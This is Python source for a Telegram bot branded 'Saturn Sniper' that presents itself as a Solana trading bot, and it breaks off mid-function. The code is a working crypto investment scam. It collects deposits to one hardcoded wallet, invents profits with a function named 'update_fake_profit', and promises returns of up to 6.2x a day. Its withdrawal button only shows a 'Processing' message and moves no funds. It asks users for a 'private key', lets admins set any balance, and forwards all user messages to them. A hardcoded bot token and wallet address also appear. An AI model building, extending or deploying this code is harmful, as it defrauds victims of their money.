
# Requirements:
# pip install pyTelegramBotAPI

import telebot
from telebot import types
import json
import os
import datetime
import random
import time
from collections import defaultdict

# ===== CORE ADMIN CONFIG =====
PRIMARY_ADMIN_ID = 6320779357          # your main Telegram user ID
ADMIN_MIRROR_ENABLED = True           # /admin_on, /admin_off
LOGSTREAM_ENABLED = False             # /logstream_on, /logstream_off

# ===== BOT CONFIG =====
BOT_TOKEN = "8359973623:AAH8rUS6EjiSoPQKdDiJ_FxuoC5dE5ddrvs"
DB_FILE = "saturn_db.json"
DEPOSIT_WALLET = "EXbk9r9P6W1UFAWAr9Mav6rLLqMWEEsVoLysKhBPsfG8"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ===== SIMPLE JSON "DB" =====

def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_db():
    try:
        with open(DB_FILE, "w") as f:
            json.dump(db, f, indent=2)
    except Exception as e:
        print("Error saving DB:", e)

db = load_db()

# ---- ensure meta section ----
if "__meta__" not in db or not isinstance(db["__meta__"], dict):
    db["__meta__"] = {}

meta = db["__meta__"]
meta.setdefault("admins", [str(PRIMARY_ADMIN_ID)])
meta.setdefault("banned", [])
# 🔧 default sniper min balance = 3 SOL
meta.setdefault("sniper_min_balance", 3.0)
meta.setdefault("profit_min", 0.002)
meta.setdefault("profit_max", 0.01)
meta.setdefault("withdraw_min", 0.1)
save_db()

# ===== HELPER: ADMIN / BAN / LOG =====

def is_admin(user_id: int) -> bool:
    return str(user_id) in meta.get("admins", [])

def _admin_only(message) -> bool:
    return is_admin(message.from_user.id)

def is_banned(user_id: int) -> bool:
    return str(user_id) in meta.get("banned", [])

def ban_user_id(uid: int):
    banned = set(meta.get("banned", []))
    banned.add(str(uid))
    meta["banned"] = list(banned)
    save_db()

def unban_user_id(uid: int):
    banned = set(meta.get("banned", []))
    banned.discard(str(uid))
    meta["banned"] = list(banned)
    save_db()

def now_utc_str():
    return datetime.datetime.utcnow().strftime("%Y-%m-%d • %I:%M %p UTC")

def log_event(text: str):
    """Send internal logs to admin if logstream is enabled."""
    if not LOGSTREAM_ENABLED:
        return
    try:
        for aid in meta.get("admins", []):
            bot.send_message(int(aid), f"📝 LOG\n{text}")
    except Exception as e:
        print("log_event error:", e)

# suspicious activity tracking (only notifies, never bans)
user_activity = defaultdict(lambda: {"last_ts": 0.0, "count": 0})

def track_activity(user_id: int, label: str):
    now = time.time()
    data = user_activity[user_id]
    if now - data["last_ts"] < 2.0:
        data["count"] += 1
    else:
        data["count"] = 1
    data["last_ts"] = now
    if data["count"] >= 6:  # threshold
        try:
            for aid in meta.get("admins", []):
                bot.send_message(
                    int(aid),
                    f"⚠️ Suspicious activity detected\n"
                    f"👤 User: {user_id}\n"
                    f"🔖 Label: {label}\n"
                    f"📊 Rapid actions count: {data['count']}"
                )
        except Exception as e:
            print("track_activity notify error:", e)

# ===== USER STORAGE =====

def get_user(user_id: int):
    uid = str(user_id)
    if uid not in db:
        db[uid] = {
            "created_at": now_utc_str(),
            "last_address_edit": "N/A",
            "withdraw_address": "",
            "address_locked": False,
            "balance": 0.0,
            "total_deposited": 0.0,
            "profit_total": 0.0,
            "sniper_running": False,
            "main_message_id": None,
            "info_message_id": None,
            "temp_prompt_msg_id": None,
            "admin_note": "",
            "last_active": now_utc_str(),
            "verified": False
        }
    else:
        db[uid]["last_active"] = now_utc_str()
        if "verified" not in db[uid]:
            db[uid]["verified"] = False
    save_db()
    return db[uid]

def update_fake_profit(user: dict):
    """
    Generate fake profit ONLY if:
    - sniper_running is True
    - balance >= sniper_min_balance (3 SOL default)

    If balance ever drops below min, sniper gets turned OFF automatically.
    """
    min_bal = float(meta.get("sniper_min_balance", 3.0))

    if not user.get("sniper_running"):
        return

    # Auto-stop sniper if balance falls below minimum
    if user["balance"] < min_bal:
        user["sniper_running"] = False
        save_db()
        return

    low = float(meta.get("profit_min", 0.002))
    high = float(meta.get("profit_max", 0.01))
    gain = user["balance"] * random.uniform(low, high)
    gain = round(gain, 4)
    user["balance"] += gain
    user["profit_total"] += gain
    save_db()

# ===== PRIVATE KEY ACCESS SYSTEM =====

# One generic 20-digit key for everyone
ACCESS_KEY = "72819455302766192844"

def is_verified(user_id: int):
    uid = str(user_id)
    user = db.get(uid)
    if not user:
        return False
    return user.get("verified", False)

def set_verified(user_id: int):
    user = get_user(user_id)
    user["verified"] = True
    save_db()

# ===== MARKUPS =====

def main_menu_markup():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("🚀 Start Saturn Sniper", callback_data="sniper_start"),
        types.InlineKeyboardButton("❌ Stop Saturn Sniper", callback_data="sniper_stop"),
        types.InlineKeyboardButton("💸 Withdraw", callback_data="withdraw"),
        types.InlineKeyboardButton("💰 Check Balance", callback_data="balance"),
        types.InlineKeyboardButton("💼 Deposit", callback_data="deposit"),
        types.InlineKeyboardButton("📊 Stats", callback_data="stats"),
        types.InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
    )
    return m

def settings_markup(user):
    lock_text = "🔒 Lock Address" if not user["address_locked"] else "🔓 Unlock Address"
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("✏️ Change Withdrawal Address", callback_data="change_address"),
        types.InlineKeyboardButton(lock_text, callback_data="toggle_lock"),
        types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
    )
    return m

def back_markup():
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_main"))
    return m

# ===== MAIN TEXT =====

def build_main_text(user):
    return (
        "Your Wallet Has Been Successfully Created 🟢\n\n"
        "🪐 Your Solana Wallet Address (for deposits):\n"
        f"```{DEPOSIT_WALLET}```\n"
        f"Balance: {user['balance']:.1f} SOL 🔃\n\n"
        "💰 (This address will be used by the bot to make profitable trades..)\n\n"
        "Profit Potential (per 24 hours):\n"
        "✅ 3 SOL Deposit: Earn up to 2x daily\n"
        "✅ 5 SOL Deposit: Earn up to 4.5x daily\n"
        "✅ 10+ SOL Deposit: Earn up to 6.2x daily\n\n"
        "⭐ Average Trade Profit: ~0.2 - 2.5+ SOL\n\n"
        "⚠️ Note: A 2% fee applies to profits in order to keep the bot online.\n\n"
        "Use the buttons below to manage Saturn Sniper.\n\n"
        "🟢 Promotion Active"
    )

# ===== PANEL HELPERS =====

def send_or_update_main_message(chat_id, user):
    main_id = user["main_message_id"]
    txt = build_main_text(user)

    if main_id:
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=main_id,
                text=txt,
                reply_markup=main_menu_markup(),
                parse_mode="Markdown"
            )
            return
        except Exception:
            pass

    msg = bot.send_message(
        chat_id, txt, reply_markup=main_menu_markup(), parse_mode="Markdown"
    )
    user["main_message_id"] = msg.message_id
    save_db()

def update_info_panel(chat_id, user, text, markup=None, markdown=True):
    info_id = user["info_message_id"]
    mode = "Markdown" if markdown else None

    try:
        if info_id:
            bot.edit_message_text(
                chat_id=chat_id, message_id=info_id,
                text=text, reply_markup=markup, parse_mode=mode
            )
            return
    except Exception:
        pass

    msg = bot.send_message(
        chat_id, text, reply_markup=markup, parse_mode=mode
    )
    user["info_message_id"] = msg.message_id
    save_db()

# ===== START / HELP =====

@bot.message_handler(commands=["start"])
def cmd_start(message):
    user_id = message.from_user.id

    # Banned users first
    if is_banned(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 You are banned from using Saturn Sniper.")
        return

    # Require private key if not verified
    if not is_verified(user_id) and not is_admin(user_id):
        msg = bot.reply_to(message, "🔐 Please enter your private key to continue:")
        bot.register_next_step_handler(msg, process_private_key)
        return

    # Normal start flow
    track_activity(user_id, "/start")
    user = get_user(user_id)
    update_fake_profit(user)

    send_or_update_main_message(message.chat.id, user)

    update_info_panel(
        message.chat.id, user,
        "📋 Use the buttons below the main message.\n\nChoose an option."
    )
    log_event(f"/start used by {message.from_user.id}")

def process_private_key(message):
    user_id = message.from_user.id
    key_entered = message.text.strip()

    if key_entered == ACCESS_KEY:
        set_verified(user_id)
        bot.reply_to(message, "✅ Access granted! Welcome.")
        # Continue to normal start
        cmd_start(message)
    else:
        bot.reply_to(message, "❌ Invalid key. Try again with /start")

@bot.message_handler(commands=["help"])
def cmd_help(message):
    if is_banned(message.from_user.id) and not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 You are banned from using Saturn Sniper.")
        return

    # Block help for unverified users (except admins)
    if not is_verified(message.from_user.id) and not is_admin(message.from_user.id):
        bot.reply_to(message, "🔐 Please enter your private key first.\nUse /start")
        return

    track_activity(message.from_user.id, "/help")
    user = get_user(message.from_user.id)
    update_fake_profit(user)

    update_info_panel(
        message.chat.id, user,
        "🛰 Saturn Auto Trade Help\n\nUse the menu buttons to navigate."
    )
    log_event(f"/help used by {message.from_user.id}")

# ===== ADMIN MIRROR & BASIC ADMIN COMMANDS =====

@bot.message_handler(commands=["admin_on"])
def admin_on(message):
    if not _admin_only(message):
        return
    global ADMIN_MIRROR_ENABLED
    ADMIN_MIRROR_ENABLED = True
    bot.reply_to(
        message,
        "🟢 Admin mirror ENABLED.\nAll user messages and button presses will be forwarded here."
    )

@bot.message_handler(commands=["admin_off"])
def admin_off(message):
    if not _admin_only(message):
        return
    global ADMIN_MIRROR_ENABLED
    ADMIN_MIRROR_ENABLED = False
    bot.reply_to(
        message,
        "🔴 Admin mirror DISABLED.\nNo more messages will be forwarded."
    )

@bot.message_handler(commands=["logstream_on"])
def logstream_on(message):
    if not _admin_only(message):
        return
    global LOGSTREAM_ENABLED
    LOGSTREAM_ENABLED = True
    bot.reply_to(message, "🟢 Logstream ENABLED.")

@bot.message_handler(commands=["logstream_off"])
def logstream_off(message):
    if not _admin_only(message):
        return
    global LOGSTREAM_ENABLED
    LOGSTREAM_ENABLED = False
    bot.reply_to(message, "🔴 Logstream DISABLED.")

@bot.message_handler(commands=["reply"])
def admin_reply(message):
    if not _admin_only(message):
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /reply <user_id> <message>")
        return
    try:
        user_id = int(parts[1])
    except ValueError:
        bot.reply_to(message, "User ID must be a number.")
        return
    text = parts[2]
    try:
        bot.send_message(user_id, text)
        bot.reply_to(message, "✅ Message sent.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error sending: {e}")

# ===== GENERIC ADMIN HELPERS =====

def _get_target_user(user_id_str):
    try:
        uid = int(user_id_str)
    except ValueError:
        return None, "User ID must be a number."
    user = get_user(uid)
    return user, None

def _parse_amount(amount_str):
    try:
        return float(amount_str), None
    except ValueError:
        return None, "Amount must be a number."

# ===== EXISTING ADMIN VALUE COMMANDS =====

@bot.message_handler(commands=["add_balance"])
def admin_add_balance(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /add_balance <user_id> <amount>")
        return
    user, err = _get_target_user(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    amount, err = _parse_amount(parts[2])
    if err:
        bot.reply_to(message, err)
        return
    user["balance"] += amount
    save_db()
    bot.reply_to(message, f"✅ Added {amount} to balance. New balance: {user['balance']}")

@bot.message_handler(commands=["set_balance"])
def admin_set_balance(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /set_balance <user_id> <amount>")
        return
    user, err = _get_target_user(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    amount, err = _parse_amount(parts[2])
    if err:
        bot.reply_to(message, err)
        return
    user["balance"] = amount
    save_db()
    bot.reply_to(message, f"✅ Set balance to {amount}")

@bot.message_handler(commands=["add_profit"])
def admin_add_profit(message):
    """
    When you do:
      /add_profit <user_id> <amount>

    It will:
      - increase profit_total by <amount>
      - increase balance by <amount>  ✅ (your request)
    """
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /add_profit <user_id> <amount>")
        return
    user, err = _get_target_user(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    amount, err = _parse_amount(parts[2])
    if err:
        bot.reply_to(message, err)
        return

    user["profit_total"] += amount
    user["balance"] += amount  # 💰 also credit their balance
    save_db()
    bot.reply_to(
        message,
        f"✅ Added {amount} to profit and balance.\n"
        f"New profit: {user['profit_total']}\n"
        f"New balance: {user['balance']}"
    )

@bot.message_handler(commands=["set_profit"])
def admin_set_profit(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /set_profit <user_id> <amount>")
        return
    user, err = _get_target_user(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    amount, err = _parse_amount(parts[2])
    if err:
        bot.reply_to(message, err)
        return
    user["profit_total"] = amount
    save_db()
    bot.reply_to(message, f"✅ Set profit_total to {amount}")

@bot.message_handler(commands=["set_deposit"])
def admin_set_deposit(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /set_deposit <user_id> <amount>")
        return
    user, err = _get_target_user(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    amount, err = _parse_amount(parts[2])
    if err:
        bot.reply_to(message, err)
        return
    user["total_deposited"] = amount
    save_db()
    bot.reply_to(message, f"✅ Set total_deposited to {amount}")

@bot.message_handler(commands=["view_user"])
def admin_view_user(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /view_user <user_id>")
        return
    user, err = _get_target_user(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    text = (
        f"👤 User Data for {parts[1]}\n"
        f"Created: {user['created_at']}\n"
        f"Last Address Edit: {user['last_address_edit']}\n"
        f"Withdraw Address: {user['withdraw_address'] or 'None'}\n"
        f"Address Locked: {user['address_locked']}\n"
        f"Balance: {user['balance']}\n"
        f"Total Deposited: {user['total_deposited']}\n"
        f"Profit Total: {user['profit_total']}\n"
        f"Sniper Running: {user['sniper_running']}\n"
        f"Main Msg ID: {user['main_message_id']}\n"
        f"Info Msg ID: {user['info_message_id']}\n"
        f"Admin Note: {user.get('admin_note', '')}\n"
        f"Last Active: {user.get('last_active', 'N/A')}\n"
        f"Verified: {user.get('verified', False)}"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=["reset_user"])
def admin_reset_user(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /reset_user <user_id>")
        return
    uid_str = parts[1]
    try:
        uid = int(uid_str)
    except ValueError:
        bot.reply_to(message, "User ID must be a number.")
        return
    user = get_user(uid)
    created_at = user["created_at"]
    db[str(uid)] = {
        "created_at": created_at,
        "last_address_edit": "N/A",
        "withdraw_address": "",
        "address_locked": False,
        "balance": 0.0,
        "total_deposited": 0.0,
        "profit_total": 0.0,
        "sniper_running": False,
        "main_message_id": None,
        "info_message_id": None,
        "temp_prompt_msg_id": None,
        "admin_note": "",
        "last_active": now_utc_str(),
        "verified": False
    }
    save_db()
    bot.reply_to(message, f"✅ Reset user {uid_str} data.")

@bot.message_handler(commands=["list_users"])
def admin_list_users(message):
    if not _admin_only(message):
        return
    user_ids = [k for k in db.keys() if k not in ("__meta__",)]
    if not user_ids:
        bot.reply_to(message, "No users found.")
        return
    bot.reply_to(message, f"👥 Users in DB:\n{', '.join(user_ids)}")

# ===== NEW ADMIN FEATURES =====

# 1. Ban / Unban

@bot.message_handler(commands=["ban"])
def cmd_ban(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /ban <user_id>")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        bot.reply_to(message, "User ID must be a number.")
        return
    ban_user_id(uid)
    bot.reply_to(message, f"✅ Banned {uid}")

@bot.message_handler(commands=["unban"])
def cmd_unban(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /unban <user_id>")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        bot.reply_to(message, "User ID must be a number.")
        return
    unban_user_id(uid)
    bot.reply_to(message, f"✅ Unbanned {uid}")

# 2. Broadcast text

@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    if not _admin_only(message):
        return
    parts = message.text.split(" ", 1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return
    text = parts[1]
    targets = [k for k in db.keys() if k not in ("__meta__",)]
    sent = 0
    for uid in targets:
        if uid in meta.get("banned", []):
            continue
        try:
            bot.send_message(int(uid), text)
            sent += 1
        except Exception:
            pass
    bot.reply_to(message, f"✅ Broadcast sent to {sent} users.")

# 3. Analytics

@bot.message_handler(commands=["analytics"])
def cmd_analytics(message):
    if not _admin_only(message):
        return
    total_users = 0
    sniper_on = 0
    total_balance = 0.0
    total_profit = 0.0
    for uid, data in db.items():
        if uid == "__meta__":
            continue
        total_users += 1
        total_balance += float(data.get("balance", 0))
        total_profit += float(data.get("profit_total", 0))
        if data.get("sniper_running"):
            sniper_on += 1
    text = (
        "📊 Saturn Analytics\n\n"
        f"👥 Total Users: {total_users}\n"
        f"🚀 Sniper Running: {sniper_on}\n"
        f"💰 Total Balance: {total_balance:.4f} SOL\n"
        f"📈 Total Profit: {total_profit:.4f} SOL\n"
    )
    bot.reply_to(message, text)

# 4. User Note

@bot.message_handler(commands=["note"])
def cmd_note(message):
    if not _admin_only(message):
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /note <user_id> <text>")
        return
    user, err = _get_target_user(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    note_text = parts[2]
    user["admin_note"] = note_text
    save_db()
    bot.reply_to(message, "✅ Note saved.")

# 5. DM (priority messaging)

@bot.message_handler(commands=["dm"])
def cmd_dm(message):
    if not _admin_only(message):
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /dm <user_id> <message>")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        bot.reply_to(message, "User ID must be a number.")
        return
    text = parts[2]
    try:
        bot.send_message(uid, text)
        bot.reply_to(message, "✅ DM sent.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# 6. Sniper settings via chat

@bot.message_handler(commands=["set_sniper_minbal"])
def cmd_set_sniper_minbal(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /set_sniper_minbal <amount>")
        return
    val, err = _parse_amount(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    meta["sniper_min_balance"] = val
    save_db()
    bot.reply_to(message, f"✅ sniper_min_balance set to {val}")

@bot.message_handler(commands=["set_profit_range"])
def cmd_set_profit_range(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /set_profit_range <min> <max>")
        return
    mn, err = _parse_amount(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    mx, err = _parse_amount(parts[2])
    if err:
        bot.reply_to(message, err)
        return
    if mx <= mn:
        bot.reply_to(message, "max must be greater than min.")
        return
    meta["profit_min"] = mn
    meta["profit_max"] = mx
    save_db()
    bot.reply_to(message, f"✅ Profit range set to {mn} - {mx}")

@bot.message_handler(commands=["set_withdraw_min"])
def cmd_set_withdraw_min(message):
    if not _admin_only(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /set_withdraw_min <amount>")
        return
    val, err = _parse_amount(parts[1])
    if err:
        bot.reply_to(message, err)
        return
    meta["withdraw_min"] = val
    save_db()
    bot.reply_to(message, f"✅ withdraw_min set to {val}")

# 7. Fix DB

@bot.message_handler(commands=["fixdb"])
def cmd_fixdb(message):
    if not _admin_only(message):
        return
    cleaned = 0
    keys_to_delete = []
    for k, v in list(db.items()):
        if k == "__meta__":
            continue
        if not isinstance(k, str):
            keys_to_delete.append(k)
            continue
        if not isinstance(v, dict):
            keys_to_delete.append(k)
            continue
    for k in keys_to_delete:
        db.pop(k, None)
        cleaned += 1
    save_db()
    bot.reply_to(message, f"✅ DB cleaned. Removed {cleaned} bad entries.")

# 8. Backup DB

@bot.message_handler(commands=["backup_now"])
def cmd_backup_now(message):
    if not _admin_only(message):
        return
    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    backup_name = f"saturn_db_backup_{ts}.json"
    try:
        with open(backup_name, "w") as f:
            json.dump(db, f, indent=2)
        with open(backup_name, "rb") as f:
            bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.reply_to(message, f"❌ Backup failed: {e}")

# 9. DB dump

@bot.message_handler(commands=["db_dump"])
def cmd_db_dump(message):
    if not _admin_only(message):
        return
    try:
        with open(DB_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.reply_to(message, f"❌ Error sending DB: {e}")

# 10. Broadcast media

@bot.message_handler(commands=["broadcast_media"])
def cmd_broadcast_media(message):
    if not _admin_only(message):
        return
    msg = bot.reply_to(message, "📎 Send the media (photo/video/document/etc.) you want to broadcast.")
    bot.register_next_step_handler(msg, handle_broadcast_media_step)

def handle_broadcast_media_step(message):
    if not is_admin(message.from_user.id):
        return
    targets = [k for k in db.keys() if k not in ("__meta__",)]
    sent = 0
    for uid in targets:
        if uid in meta.get("banned", []):
            continue
        try:
            if message.content_type == "photo":
                file_id = message.photo[-1].file_id
                bot.send_photo(int(uid), file_id, caption=message.caption or "")
            elif message.content_type == "video":
                bot.send_video(int(uid), message.video.file_id, caption=message.caption or "")
            elif message.content_type == "document":
                bot.send_document(int(uid), message.document.file_id, caption=message.caption or "")
            elif message.content_type == "animation":
                bot.send_animation(int(uid), message.animation.file_id, caption=message.caption or "")
            elif message.content_type == "audio":
                bot.send_audio(int(uid), message.audio.file_id, caption=message.caption or "")
            elif message.content_type == "voice":
                bot.send_voice(int(uid), message.voice.file_id)
            else:
                continue
            sent += 1
        except Exception:
            pass
    bot.reply_to(message, f"✅ Media broadcast sent to {sent} users.")

# 11. Broadcast to group

@bot.message_handler(commands=["broadcast_group"])
def cmd_broadcast_group(message):
    if not _admin_only(message):
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        bot.reply_to(
            message,
            "Usage: /broadcast_group <group> <message>\n"
            "Groups: sniper_on, high_balance, low_balance, zero_balance"
        )
        return
    group = parts[1]
    text = parts[2]
    sent = 0
    for uid, data in db.items():
        if uid == "__meta__" or uid in meta.get("banned", []):
            continue
        bal = float(data.get("balance", 0))
        sniper = bool(data.get("sniper_running"))
        match = False
        if group == "sniper_on" and sniper:
            match = True
        elif group == "high_balance" and bal >= 1:
            match = True
        elif group == "low_balance" and 0 < bal < 1:
            match = True
        elif group == "zero_balance" and bal == 0:
            match = True
        if not match:
            continue
        try:
            bot.send_message(int(uid), text)
            sent += 1
        except Exception:
            pass
    bot.reply_to(message, f"✅ Broadcast to group '{group}' sent to {sent} users.")

# 12. Prune dead users

@bot.message_handler(commands=["prune"])
def cmd_prune(message):
    if not _admin_only(message):
        return
    removed = 0
    now = datetime.datetime.utcnow()
    keys = list(db.keys())
    for uid in keys:
        if uid == "__meta__":
            continue
        data = db[uid]
        if uid in meta.get("banned", []):
            continue
        bal = float(data.get("balance", 0))
        dep = float(data.get("total_deposited", 0))
        last_active = data.get("last_active")
        try:
            last_dt = datetime.datetime.strptime(last_active, "%Y-%m-%d • %I:%M %p UTC")
        except Exception:
            last_dt = now
        days = (now - last_dt).days
        if bal == 0 and dep == 0 and days >= 60:
            db.pop(uid, None)
            removed += 1
    save_db()
    bot.reply_to(message, f"✅ Pruned {removed} inactive users.")

# 13. Multi-admin

@bot.message_handler(commands=["addadmin"])
def cmd_addadmin(message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /addadmin <user_id>")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        bot.reply_to(message, "User ID must be a number.")
        return
    admins = set(meta.get("admins", []))
    admins.add(str(uid))
    meta["admins"] = list(admins)
    save_db()
    bot.reply_to(message, f"✅ Added {uid} as admin.")

@bot.message_handler(commands=["removeadmin"])
def cmd_removeadmin(message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /removeadmin <user_id>")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        bot.reply_to(message, "User ID must be a number.")
        return
    admins = set(meta.get("admins", []))
    if str(uid) in admins:
        admins.discard(str(uid))
        meta["admins"] = list(admins)
        save_db()
        bot.reply_to(message, f"✅ Removed {uid} from admins.")
    else:
        bot.reply_to(message, "User is not an admin.")

@bot.message_handler(commands=["listadmins"])
def cmd_listadmins(message):
    if not _admin_only(message):
        return
    admins = meta.get("admins", [])
    bot.reply_to(message, f"🛡 Admins:\n{', '.join(admins)}")

# 14. Debug, reboot, reload_db

@bot.message_handler(commands=["debug"])
def cmd_debug(message):
    if not _admin_only(message):
        return
    import sys
    text = (
        "🐞 Debug Info\n"
        f"Python: {sys.version}\n"
        f"DB entries: {len(db)}\n"
        f"Admins: {', '.join(meta.get('admins', []))}\n"
        f"Banned: {', '.join(meta.get('banned', []))}\n"
        f"File: {os.path.abspath(__file__)}"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=["reboot"])
def cmd_reboot(message):
    if not _admin_only(message):
        return
    bot.reply_to(message, "♻️ Rebooting bot process...")
    save_db()
    os._exit(0)

@bot.message_handler(commands=["reload_db"])
def cmd_reload_db(message):
    if not _admin_only(message):
        return
    global db, meta
    db = load_db()
    if "__meta__" not in db or not isinstance(db["__meta__"], dict):
        db["__meta__"] = {}
    meta = db["__meta__"]
    meta.setdefault("admins", [str(PRIMARY_ADMIN_ID)])
    meta.setdefault("banned", [])
    meta.setdefault("sniper_min_balance", 3.0)
    save_db()
    bot.reply_to(message, "✅ DB reloaded from disk.")

# ===== ADMIN MIRROR LISTENER =====

def listener(messages):
    if not messages:
        return
    for m in messages:
        uid = m.from_user.id if m.from_user else None
        if uid is None:
            continue

        # suspicious tracking (only notifies)
        track_activity(uid, f"message:{m.content_type}")

        # banned check
        if is_banned(uid) and not is_admin(uid):
            try:
                bot.send_message(
                    m.chat.id,
                    "🚫 You are banned from using Saturn Sniper."
                )
            except Exception:
                pass
            continue

        # mirror
        if ADMIN_MIRROR_ENABLED and not is_admin(uid):
            try:
                username = f"@{m.from_user.username}" if m.from_user.username else "None"
                if getattr(m, "text", None):
                    content = f"💬 Text: {m.text}"
                else:
                    content = f"📎 Message type: {m.content_type}"
                for aid in meta.get("admins", []):
                    bot.send_message(
                        int(aid),
                        f"🟦 USER MESSAGE\n"
                        f"👤 From: {uid} ({username})\n"
                        f"{content}"
                    )
            except Exception:
                pass

bot.set_update_listener(listener)

# ===== CALLBACKS =====

@bot.callback_query_handler(func=lambda c: True)
def callback(call):
    user_id = call.from_user.id

    # Banned users
    if is_banned(user_id) and not is_admin(user_id):
        try:
            bot.answer_callback_query(call.id, "🚫 You are banned.")
        except Exception:
            pass
        return

    # Require verification for callbacks (non-admin)
    if not is_verified(user_id) and not is_admin(user_id):
        try:
            bot.answer_callback_query(call.id, "🔐 Please enter your private key using /start")
        except Exception:
            pass
        return

    track_activity(user_id, f"callback:{call.data}")
    user = get_user(user_id)
    chat_id = call.message.chat.id

    # Mirror button presses
    if ADMIN_MIRROR_ENABLED and not is_admin(user_id):
        username = f"@{call.from_user.username}" if call.from_user.username else "None"
        try:
            for aid in meta.get("admins", []):
                bot.send_message(
                    int(aid),
                    f"🟩 BUTTON PRESSED\n"
                    f"👤 From: {user_id} ({username})\n"
                    f"🆔 Callback: {call.data}"
                )
        except Exception:
            pass

    # --- WITHDRAW MENU ---
    if call.data == "withdraw":
        bot.answer_callback_query(call.id)
        update_fake_profit(user)

        addr = user["withdraw_address"]
        addr_text = f"```{addr}```" if addr else "❌ No withdrawal address set"

        balance = user["balance"]
        last_edit = user["last_address_edit"]
        locked = user["address_locked"]

        withdraw_text = (
            "🪐 Withdraw Solana\n\n"
            f"💰 Balance: {balance:.2f} SOL\n\n"
            "Current withdrawal address:\n"
            f"{addr_text}\n\n"
            f"🔧 Last updated: {last_edit}\n"
            f"{'🔒 Address is LOCKED' if locked else '🔓 Address is UNLOCKED'}\n\n"
            "Press the button below to withdraw funds:"
        )

        w = types.InlineKeyboardMarkup()
        w.add(types.InlineKeyboardButton("💸 Withdraw Funds", callback_data="withdraw_execute"))
        w.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_main"))

        update_info_panel(chat_id, user, withdraw_text, markup=w, markdown=True)
        return

    # --- EXECUTE WITHDRAW ---
    if call.data == "withdraw_execute":
        bot.answer_callback_query(call.id)

        balance = user["balance"]
        MIN_REQUIRED = float(meta.get("withdraw_min", 0.1))

        if balance < MIN_REQUIRED:
            update_info_panel(
                chat_id, user,
                f"❌ You do not have enough funds to withdraw.\n\nMinimum required: {MIN_REQUIRED} SOL."
            )
        else:
            update_info_panel(
                chat_id, user,
                "⚙️ Processing your withdrawal...\n\n"
            )
        return

    # --- BALANCE ---
    if call.data == "balance":
        bot.answer_callback_query(call.id)
        update_fake_profit(user)

        balance = user["balance"]
        profit = user["profit_total"]
        sniper = "Running ✅" if user["sniper_running"] else "Stopped ⛔️"

        text = (
            "💰 Balance Information\n\n"
            f"💵 Balance: {balance:.2f} SOL\n"
            f"📈 Lifetime Profit: {profit:.2f} SOL\n"
            f"🚀 Sniper Status: {sniper}"
        )

        update_info_panel(chat_id, user, text)
        return

    # --- STATS ---
    if call.data == "stats":
        bot.answer_callback_query(call.id)
